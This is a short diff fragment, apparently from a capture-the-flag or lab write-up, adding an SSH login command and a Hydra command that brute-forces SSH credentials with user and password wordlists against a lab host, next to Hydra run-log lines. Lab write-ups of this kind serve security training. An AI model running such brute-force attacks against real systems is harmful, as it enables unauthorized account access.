@@ -15,3 +15,11 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-28 16:30:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-28 16:30:55
 
 ```
+
+```
+ssh harry.potter@94.237.62.149 -p 44335
+```
+
+```
+hydra -L user_harry.txt -P harry.txt -u -f ssh://94.237.62.149:44335 -t 4
+```
